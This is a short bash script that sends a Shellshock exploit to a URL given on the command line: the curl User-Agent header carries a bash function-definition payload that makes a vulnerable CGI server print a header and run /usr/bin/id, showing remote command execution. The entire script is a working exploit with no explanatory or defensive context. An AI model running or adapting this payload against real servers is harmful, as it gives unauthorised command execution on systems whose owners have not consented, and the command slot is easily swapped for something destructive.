#!/bin/bash

if [ -z ${1} ]; then
    echo "Usage: ${0} <url>"
    exit
fi

URL=$@
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" $URL
